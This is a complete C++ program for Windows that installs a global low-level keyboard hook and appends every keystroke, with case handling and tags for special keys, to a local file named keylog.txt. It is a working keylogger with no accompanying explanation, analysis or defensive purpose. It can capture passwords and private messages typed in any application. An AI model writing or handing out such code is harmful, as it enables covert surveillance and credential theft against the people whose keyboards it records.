#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

// Global variables
HHOOK keyboardHook; 
ofstream logfile("keylog.txt", ios::app); 

// Function to log keys
void LogKey(int key) {
    bool isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
    bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    if (key >= 'A' && key <= 'Z') {
    	// XOR to handle Shift and Caps Lock together
        if (isShiftPressed ^ isCapsLockOn) { 
         	// Log uppercase
            logfile << char(key);
        } else {
        	 // Convert to lowercase
            logfile << char(key + 32);
        }
    } else if (key == VK_BACK)
        logfile << "[BACKSPACE] ";
    else if (key == VK_RETURN)
        logfile << "[Enter]\n";
    else if (key == VK_SPACE)
        logfile << " ";
    else if (key == VK_SHIFT)
        logfile << "[SHIFT] ";
    else if (key == VK_TAB)
        logfile << "[TAB] ";
    else if (key == VK_ESCAPE)
        logfile << "[ESCAPE] ";
    else
    	 // Log other characters as-is
        logfile << char(key);
 	// To write the key immediately
    logfile.flush();
}

// Low-level keyboard procedure
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            int key = kbdStruct->vkCode; 
            LogKey(key); 
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam); 
}

// Install hook
void InstallHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        logfile << "\n Failed to install hook!\n" << endl;
    } else {
        logfile << "\n Hook installed successfully.\n" << endl;
    }
}

// Uninstall hook
void UninstallHook() {
    UnhookWindowsHookEx(keyboardHook);
    logfile.close(); 
}

//main
int main() {
    InstallHook();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UninstallHook(); 
    return 0;
}

